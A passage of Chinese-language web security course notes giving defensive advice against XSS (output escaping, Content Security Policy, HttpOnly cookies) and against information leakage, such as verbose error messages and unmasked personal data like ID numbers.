    - 对于 JavaScript 的输出转义，特别是涉及到 JavaScript 变量的过滤仅仅使用 `htmlspecialchars()` 是不够的，很多 RESTful 接口应用还会使用 `json_encode()` 去处理服务端脚本输出给客户端的 JavaScript 变量值
    
- 在客户端脚本中尽可能使用 `innerText()` 之类的函数来过滤服务端脚本对客户端变量的赋值
- 联合现代浏览器的客户端安全机制，共同对抗 XSS
    - 在服务端输出 HTML 时，加上 [Content Security Policy](https://w3c.github.io/webappsec-csp/) 的 HTTP 响应头
    - 低版本浏览器可能不支持，但某些低版本浏览器支持一些自定义 HTTP 响应头 [X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection) 来限制加载执行不可信脚本
    - 在设置 Cookie 时，加上 HttpOnly 参数避免关键 Cookie 字段被脚本访问
- 由于 XSS 漏洞的实际触发位置是在浏览器，因此即使按照上述服务端脚本的代码安全最佳实践去实现「净化」输出，但如果 XSS 漏洞再利用一些浏览器漏洞（特别是一些字符集编码漏洞）进行配合，那么依然难免 XSS 漏洞
- 不过好在这种情况发生的概率要远远低于由于服务端脚本没有「净化」输出导致的 XSS
- 使用正确的「净化」输出方案是在代码级别防御 XSS 的最重要手段
### 信息泄漏
- 代码运行时调试信息泄露
    - 例如前述 SQL 注入漏洞 在有错误信息回显时的漏洞利用难度会大大降低
- 隐私数据未做脱敏操作就输出给客户端
    - 如信用卡号、手机号、身份证号等，在发送给前端之前用星号代替
    - 中国的 18 位公民身份证号码从最早的全部明文显示在软件界面上，发展经历了遮蔽4位数字、8位数字，直到只显示首末 2 位数字（如支付宝）
    - 非必需展示和发送给客户端的数据，应避免在服务端脚本直接输出